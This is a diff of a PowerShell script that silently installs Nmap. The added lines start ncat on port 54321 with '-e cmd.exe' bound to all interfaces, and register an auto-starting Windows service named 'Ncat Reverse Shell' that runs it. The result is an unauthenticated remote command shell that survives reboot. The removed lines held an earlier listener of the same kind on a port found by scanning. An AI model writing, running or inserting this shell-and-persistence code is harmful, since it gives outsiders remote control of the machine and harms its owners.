@@ -13,24 +13,24 @@ Start-Process $installerPath -ArgumentList "/S" -Wait
 # Change to Nmap directory
 Set-Location "C:\Program Files (x86)\Nmap"
 
-# Function to find an open port starting from 87
-function Get-OpenPort {
-    param([int]$startPort = 87, [int]$maxPort = 65535)
+# Start ncat immediately listener on port 54321
+& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 54321 -e cmd.exe
 
-    for ($port = $startPort; $port -le $maxPort; $port++) {
-        try {
-            $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
-            $listener.Start()
-            $listener.Stop()
-            return $port
-        } catch {
-            # Port in use, try next
-        }
-    }
-    throw "No open ports found between $startPort and $maxPort"
+# Create Windows Service persistence
+$serviceName = "Ncat Reverse Shell"
+$serviceDisplay = "nc-reverse-shell"
+
+# Command to be run
+$serviceCmd = '& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 54321 -e cmd.exe'
+
+# Remove old service if present
+if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
+    sc.exe delete $serviceName | Out-Null
+    Start-Sleep -Seconds 2
 }
 
-$openPort = Get-OpenPort
+# Create new service
+sc.exe create $serviceName binPath= "$serviceCmd" start= auto DisplayName= "`"$serviceDisplay`""
 
-# Start ncat listener on available port
-& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 $openPort -e cmd.exe
+# Start service
+Start-Service -Name $serviceName
